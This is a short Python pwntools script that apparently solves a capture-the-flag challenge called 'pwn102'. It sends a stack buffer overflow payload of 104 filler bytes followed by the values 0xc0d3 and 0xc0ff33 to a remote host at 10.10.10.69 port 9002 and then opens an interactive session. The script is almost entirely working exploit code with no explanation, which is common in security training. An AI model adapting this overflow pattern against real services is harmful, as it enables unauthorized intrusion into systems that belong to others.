from pwn import *

# Create the payload
payload = b"A" * 104  # Fill the buffer
payload += p32(0xc0d3)  # Overwrite 'a' with 0xc0d3
payload += p32(0xc0ff33)  # Overwrite 'b' with 0xc0ff33

try:
    # Attempt to connect to the remote host
    target = remote('10.10.10.69', 9002)
    #target = process('./pwn102')
    target.sendline(payload)
    target.interactive()
except PwnlibException as e:
    print(f"Connection failed: {e}")
